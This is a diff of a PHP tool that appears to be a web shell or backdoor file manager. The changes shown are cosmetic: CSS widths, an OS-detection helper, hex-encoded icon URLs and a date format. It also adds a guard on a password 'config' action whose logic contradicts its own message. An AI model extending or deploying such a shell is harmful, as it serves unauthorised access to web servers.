@@ -148,10 +148,11 @@ if (!isset($_SESSION['login'])) {
     }
     div.intotool {
         overflow-x: auto;
-        width:97.8%;
+        width:99%;
+        z-index: 99;
     }
     div.intool {
-        width: 200%;
+        width: 220%;
         padding: 11px;
     }
     div.tool a.logout {
@@ -1212,6 +1213,9 @@ function myFunction() {
                     break;
             }
         }
+        public static function OS() {
+        	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
+		}
         public static function info($info = null) {
             switch ($info) {
                 case 'hdd':
@@ -1359,6 +1363,7 @@ function myFunction() {
                     <?php
                     break;
                 case 'config':
+                	if(x::OS() == "Windows") die(print("<script>alert('Just for windows server')</script>"));
                     if (isset($_POST['submit'])) {
                         if (self::config($_POST['passwd'])) {
                             print("success");
@@ -1390,10 +1395,6 @@ function myFunction() {
                     </div>
                     <?php
                     break;
-                
-                default:
-                    # code...
-                    break;
             }
         } 
         public static function countDir($filename) {
@@ -1420,7 +1421,7 @@ function myFunction() {
                     print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3333372f3333373933372e737667");
                     break;
                 case 'txt':
-                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f333032322f333032323330352e737667");
+                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3333372f3333373935362e737667");
                     break;
                 case 'json':
                     print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3133362f3133363532352e737667");
@@ -1432,7 +1433,7 @@ function myFunction() {
                     print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3333372f3333373934382e737667");
                     break;
                 case 'ico':
-                    print self::unhex("68747470733a2f2f7777772e666c617469636f6e2e636f6d2f7072656d69756d2d69636f6e2f69636f6e732f7376672f323236362f323236363830352e737667");
+                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f313132362f313132363837332e737667");
                     break;
                 case 'jpg':
                     print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3133362f3133363532342e737667");
@@ -1444,7 +1445,7 @@ function myFunction() {
                     print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f313132362f313132363835362e737667");
                     break;
                 case 'pdf':
-                    print self::unhex("68747470733a2f2f7777772e666c617469636f6e2e636f6d2f7072656d69756d2d69636f6e2f69636f6e732f7376672f323838392f323838393335382e737667");
+                    print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f313132362f313132363836322e737667");
                     break;
                 case 'mp3':
                     print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f323631312f323631313430312e737667");
@@ -1480,7 +1481,7 @@ function myFunction() {
             } return $string;
         }
         public static function ftime($filename) {
-             return date('l d M Y - H:i A', filemtime($filename));
+             return date('d M Y - H:i A', filemtime($filename));
         }
         public static function countStuff($handle, &$fileCount, &$folderCount) {
             if ($handle = opendir($handle)) {
